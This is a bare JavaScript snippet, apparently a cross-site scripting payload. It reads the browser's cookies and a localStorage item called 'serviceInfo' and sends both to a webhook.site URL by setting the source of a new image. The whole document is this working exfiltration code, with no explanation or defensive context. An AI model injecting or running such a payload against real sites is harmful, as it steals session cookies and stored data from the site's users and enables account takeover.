(function(){
  var d = localStorage.getItem('serviceInfo');
  var c = document.cookie;
  var url = '//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?data=' 
    + encodeURIComponent(d)
    + '&cookies='
    + encodeURIComponent(c);
  new Image().src = url;
})();
